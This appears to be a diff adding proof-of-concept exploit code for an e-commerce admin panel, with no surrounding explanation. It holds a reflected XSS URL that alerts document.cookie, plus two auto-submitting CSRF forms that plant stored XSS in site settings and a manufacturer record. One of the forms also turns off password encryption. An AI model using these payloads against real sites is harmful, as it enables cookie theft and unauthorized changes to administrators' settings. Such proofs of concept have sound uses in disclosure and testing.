@@ -1,0 +1,38 @@
+1. http://www.example.com/admin/admin_product.php?category_id=0&amp;item_id=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+2. &lt;form action=&quot;http://www.example.com/admin/admin_global_settings.php&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;operation&quot; value=&quot;save&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;rp&quot; value=&quot;admin.php&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;tab&quot; value=&quot;general&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;site_name&quot; value=&quot;Default Site&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;site_url&quot; value=&quot;http://host/&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;admin_email&quot; value=&quot;email@example.com&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;layout_id&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;password_encrypt&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;admin_password_encrypt&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;html_below_footer&quot; value=&#039;12345&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;operation&quot; value=&quot;save&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+3. &lt;form action=&quot;http://www.example.com/admin/admin_manufacturer.php&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;operation&quot; value=&quot;save&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;manufacturer_id&quot; value=&quot;3&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;manufacturer_name&quot; value=&#039;Company&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;manufacturer_order&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;friendly_url&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;affiliate_code&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;short_description&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;full_description&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;image_small&quot; value=&quot;images/manufacturers/small/company.gif&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;image_small_alt&quot; value=&quot;company&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;image_large&quot; value=&quot;images/manufacturers/large/company.gif&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;image_large_alt&quot; value=&quot;company&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
